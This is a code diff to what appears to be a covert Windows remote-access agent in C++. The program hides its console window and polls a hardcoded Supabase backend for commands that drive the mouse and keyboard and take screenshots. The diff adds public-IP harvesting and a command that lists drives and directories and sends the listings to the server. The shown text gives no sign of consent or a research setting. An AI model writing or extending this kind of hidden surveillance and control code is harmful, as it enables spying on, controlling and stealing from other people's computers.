@@ -13,6 +13,7 @@
 using namespace Gdiplus;
 
 std::string computerName;
+std::string publicIP;
 const std::string SB_HOST="odocuexiouhmmkpwtuwk.supabase.co";
 const std::string SB_KEY="sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED";
 
@@ -82,6 +83,28 @@ std::string httpsDelete(const std::string& path) {
     WinHttpReceiveResponse(r, 0);
     WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
     return "";
+}
+
+std::string httpsGetUrl(const std::string& host, const std::string& path) {
+    HINTERNET s = WinHttpOpen(L"P/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
+    if (!s) return "";
+    HINTERNET c = WinHttpConnect(s, std::wstring(host.begin(),host.end()).c_str(), 443, 0);
+    if (!c) { WinHttpCloseHandle(s); return ""; }
+    HINTERNET r = WinHttpOpenRequest(c, L"GET", std::wstring(path.begin(),path.end()).c_str(), 0, 0, 0, WINHTTP_FLAG_SECURE);
+    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return ""; }
+    WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
+    WinHttpReceiveResponse(r, 0);
+    std::string out; DWORD n; char buf[256];
+    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n]=0; out+=buf; }
+    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
+    return out;
+}
+
+std::string getPublicIP() {
+    std::string r = httpsGetUrl("api.ipify.org", "/");
+    if(r.empty()) r = httpsGetUrl("icanhazip.com", "/");
+    while(!r.empty()&&(r.back()=='\n'||r.back()=='\r')) r.pop_back();
+    return r.empty()?"unknown":r;
 }
 
 std::string base64Encode(const unsigned char* data, size_t len) {
@@ -188,6 +211,49 @@ std::string extractJson(const std::string& json, const std::string& key) {
     return json.substr(valStart, valEnd - valStart);
 }
 
+std::string listDir(const std::string& path) {
+    std::string searchPath = path;
+    if(searchPath.empty()){
+        DWORD drives=GetLogicalDrives();
+        std::string out="[";
+        for(int i=0;i<26;i++){
+            if(drives&(1<<i)){
+                char d[4]={(char)('A'+i),':','\\',0};
+                std::string lbl=d;
+                ULONG sn,maxComp,flags;
+                GetVolumeInformationA(d,0,0,&sn,&maxComp,&flags,0,0);
+                if(out.size()>1) out+=",";
+                out+="{\"n\":\"";out+=d[0];out+=":\";\"s\":0,\"d\":true,\"m\":\"Drive ";
+                out+=d[0];out+="\"}";
+            }
+        }
+        out+="]";
+        return out;
+    }
+    std::string norm = searchPath;
+    if(norm.back()!='\\') norm+="\\";
+    std::string spec = norm + "*";
+    std::string out="[";
+    WIN32_FIND_DATAA fd;
+    HANDLE h=FindFirstFileA(spec.c_str(),&fd);
+    if(h!=INVALID_HANDLE_VALUE){
+        do{
+            std::string n=fd.cFileName;
+            if(n=="."||n=="..") continue;
+            if(out.size()>1) out+=",";
+            out+="{\"n\":\""+jsonEscape(n)+"\",\"s\":"+std::to_string(fd.nFileSizeLow)+",\"d\":"+(fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY?"true":"false")+",\"m\":\"";
+            FILETIME ft=fd.ftLastWriteTime;
+            SYSTEMTIME st;
+            FileTimeToSystemTime(&ft,&st);
+            char mb[32];sprintf(mb,"%04d-%02d-%02d %02d:%02d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute);
+            out+=mb;out+="\"}";
+        }while(FindNextFileA(h,&fd));
+        FindClose(h);
+    }
+    out+="]";
+    return out;
+}
+
 std::string handleMouse(const std::string& payload) {
     std::string xs=extractJson(payload,"x");
     std::string ys=extractJson(payload,"y");
@@ -223,7 +289,7 @@ std::string handleKeyboard(const std::string& payload) {
 }
 
 void sendPing() {
-    std::string body = "{\"computer\":\"" + computerName + "\"}";
+    std::string body = "{\"computer\":\"" + computerName + "\",\"ip\":\"" + publicIP + "\"}";
     httpsPost("/rest/v1/pings", body);
 }
 
@@ -254,6 +320,8 @@ DWORD WINAPI pollThread(LPVOID) {
                     result = handleKeyboard(payload);
                 } else if (type == "screen") {
                     result = takeScreenshot();
+                } else if (type == "file_list") {
+                    result = listDir(payload.empty() ? "" : payload);
                 } else {
                     result = "unknown_type";
                 }
@@ -304,6 +372,7 @@ int main() {
     HWND hwnd = GetConsoleWindow();
     if (hwnd) ShowWindow(hwnd, SW_HIDE);
     computerName = getComputerName();
+    publicIP = getPublicIP();
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
